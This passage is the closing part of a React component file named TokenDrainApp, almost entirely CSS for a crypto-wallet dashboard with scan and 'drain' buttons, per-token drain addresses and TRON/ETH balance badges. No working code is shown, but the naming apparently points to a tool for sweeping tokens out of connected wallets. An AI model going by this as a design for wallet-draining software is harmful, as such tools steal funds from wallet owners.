          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 1px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: linear-gradient(45deg, #3b82f6, #8b5cf6);
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        /* Stats */
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 25px;
        }
        
        .stat-card {
          background: linear-gradient(135deg, #222, #333);
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 1px solid #444;
        }
        
        .stat-card.primary {
          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
        }
        
        .stat-icon {
          font-size: 24px;
        }
        
        .stat-content {
          flex: 1;
        }
        
        .stat-value {
          font-size: 24px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .stat-card.primary .stat-value {
          color: white;
        }
        
        .stat-label {
          color: #aaa;
          font-size: 13px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Status */
        .status-container {
          background: #222;
          border-radius: 12px;
          padding: 15px 20px;
          margin-bottom: 20px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          border: 1px solid #333;
        }
        
        .status-message {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .status-icon {
          font-size: 20px;
        }
        
        .status-text {
          font-size: 16px;
          font-weight: 500;
        }
        
        .status-actions {
          display: flex;
          gap: 10px;
        }
        
        .eth-balance, .tron-balance {
          background: #333;
          padding: 5px 10px;
          border-radius: 6px;
          font-family: monospace;
          font-size: 14px;
        }
        
        /* Progress */
        .progress-container {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .progress-header {
          display: flex;
          justify-content: space-between;
          margin-bottom: 10px;
          font-weight: 600;
        }
        
        .progress-bar {
          height: 6px;
          background: #333;
          border-radius: 3px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          border-radius: 3px;
          transition: width 0.3s ease;
        }
        
        .progress-label {
          margin-top: 10px;
          color: #888;
          font-size: 14px;
          text-align: center;
        }
        
        /* Controls */
        .controls-container {
          margin-bottom: 25px;
        }
        
        .control-buttons {
          display: flex;
          gap: 15px;
          margin-bottom: 15px;
        }
        
        .btn {
          flex: 1;
          padding: 16px 20px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn-scan {
          background: linear-gradient(45deg, #3b82f6, #60a5fa);
          color: white;
        }
        
        .btn-drain {
          background: linear-gradient(45deg, #ef4444, #f87171);
          color: white;
        }
        
        .btn:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .spinner {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-radius: 50%;
          border-top-color: white;
          animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .drain-summary {
          text-align: center;
          color: #888;
          font-size: 14px;
          padding: 10px;
          background: #222;
          border-radius: 8px;
        }
        
        /* Modal */
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.8);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 1000;
          backdrop-filter: blur(5px);
        }
        
        .modal-content {
          background: #1a1a1a;
          border-radius: 20px;
          width: 90%;
          max-width: 500px;
          max-height: 80vh;
          overflow-y: auto;
          border: 1px solid #333;
        }
        
        .modal-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px;
          border-bottom: 1px solid #333;
        }
        
        .modal-header h3 {
          margin: 0;
          font-size: 18px;
        }
        
        .modal-close {
          background: none;
          border: none;
          color: #888;
          font-size: 24px;
          cursor: pointer;
          padding: 0;
          width: 30px;
          height: 30px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
        }
        
        .modal-close:hover {
          background: #333;
        }
        
        .modal-body {
          padding: 20px;
        }
        
        .token-info {
          text-align: center;
          margin-bottom: 20px;
          padding: 20px;
          background: #222;
          border-radius: 12px;
        }
        
        .token-symbol-large {
          font-size: 32px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .token-network {
          color: #888;
          margin-bottom: 10px;
        }
        
        .token-amount-large {
          font-size: 24px;
          font-weight: 600;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
        }
        
        .instructions {
          background: #111;
          border-radius: 12px;
          padding: 15px;
          margin-bottom: 20px;
          max-height: 200px;
          overflow-y: auto;
        }
        
        .instructions pre {
          margin: 0;
          color: #0af;
          white-space: pre-wrap;
          font-size: 14px;
          line-height: 1.5;
        }
        
        .address-box {
          background: #222;
          border-radius: 12px;
          padding: 15px;
          margin-bottom: 20px;
        }
        
        .address-label {
          color: #888;
          font-size: 14px;
          margin-bottom: 5px;
        }
        
        .address-value {
          font-family: monospace;
          font-size: 14px;
          word-break: break-all;
          margin-bottom: 10px;
          color: #0af;
        }
        
        .btn-copy {
          background: #333;
          color: white;
          border: none;
          padding: 8px 15px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          width: 100%;
        }
        
        .modal-actions {
          display: flex;
          gap: 10px;
        }
        
        .modal-actions .btn {
          flex: 1;
          padding: 12px;
        }
        
        .btn-primary {
          background: #3b82f6;
          color: white;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 25px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
        }
        
        .count-badge {
          background: #3b82f6;
          color: white;
          padding: 4px 10px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.manual {
          border-left-color: #f59e0b;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 20px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-main {
          display: flex;
          justify-content: space-between;
          margin-bottom: 5px;
        }
        
        .tx-symbol {
          font-weight: 600;
        }
        
        .tx-amount {
          font-family: monospace;
        }
        
        .tx-value {
          color: #10b981;
          font-weight: 600;
        }
        
        .tx-secondary {
          display: flex;
          justify-content: space-between;
          color: #888;
          font-size: 14px;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
          margin-bottom: 20px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.2s;
        }
        
        .token-card:hover {
          transform: translateY(-3px);
          border-color: #444;
          box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 15px;
        }
        
        .network-badge {
          padding: 5px 10px;
          border-radius: 20px;
          font-weight: 600;
          font-size: 14px;
          min-width: 50px;
          text-align: center;
        }
        
        .token-network {
          flex: 1;
          color: #888;
          font-size: 14px;
        }
        
        .token-type {
          padding: 3px 8px;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-details {
          margin-bottom: 15px;
        }
        
        .token-amount {
          font-size: 22px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
        }
        
        .token-drain-info {
          background: #222;
          border-radius: 8px;
          padding: 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          border: 1px solid #333;
        }
        
        .drain-address {
          font-family: monospace;
          font-size: 12px;
          color: #888;
          flex: 1;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
        }
        
        .copy-btn {
          background: #333;
          color: white;
          border: none;
          padding: 5px 10px;
          border-radius: 6px;
          font-size: 12px;
          cursor: pointer;
          margin-left: 10px;
        }
        
        .copy-btn:hover {
          background: #444;
        }
        
        /* Empty State */
        .empty-state {
          text-align: center;
          padding: 60px 20px;
          background: #222;
          border-radius: 16px;
          border: 1px solid #333;
        }
        
        .empty-icon {
          font-size: 48px;
          margin-bottom: 20px;
        }
        
        .empty-state h3 {
          margin: 0 0 10px 0;
          font-size: 24px;
        }
        
        .empty-state p {
          color: #888;
          margin-bottom: 30px;
          line-height: 1.6;
        }
        
        .supported-networks {
          margin-top: 30px;
        }
        
        .supported-networks p {
          margin-bottom: 10px;
          color: #aaa;
        }
        
        .network-tags {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          justify-content: center;
        }
        
        .network-tag {
          padding: 4px 10px;
          border: 1px solid;
          border-radius: 20px;
          font-size: 12px;
        }
        
        .network-tag.more {
          border-color: #666;
          color: #666;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #888;
          margin-bottom: 30px;
          line-height: 1.6;
          font-size: 16px;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features-grid {
          display: grid;
          grid-template-columns: repeat(2, 1fr);
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .feature {
          background: #222;
          padding: 15px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .feature-icon {
          font-size: 20px;
        }
        
        .warning-note {
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid #ef4444;
          border-radius: 12px;
          padding: 15px;
          text-align: left;
        }
        
        .warning-icon {
          font-size: 20px;
          margin-bottom: 10px;
          display: block;
        }
        
        .warning-note p {
          margin: 0;
          color: #f87171;
          font-size: 14px;
          line-height: 1.6;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
        }
        
        .footer-content {
          display: flex;
          justify-content: space-between;
          color: #888;
          margin-bottom: 10px;
          font-size: 14px;
        }
        
        .separator {
          margin: 0 10px;
          opacity: 0.5;
        }
        
        .status-indicator {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        .footer-warning {
          text-align: center;
          color: #f59e0b;
          font-size: 12px;
          padding: 10px;
          background: rgba(245, 158, 11, 0.1);
          border-radius: 8px;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-grid {
            grid-template-columns: repeat(2, 1fr);
          }
          
          .control-buttons {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .features-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 10px;
            text-align: center;
          }
          
          .panel-summary {
            flex-direction: column;
            gap: 5px;
          }
          
          .status-container {
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
          }
          
          .status-actions {
            width: 100%;
            justify-content: space-between;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;

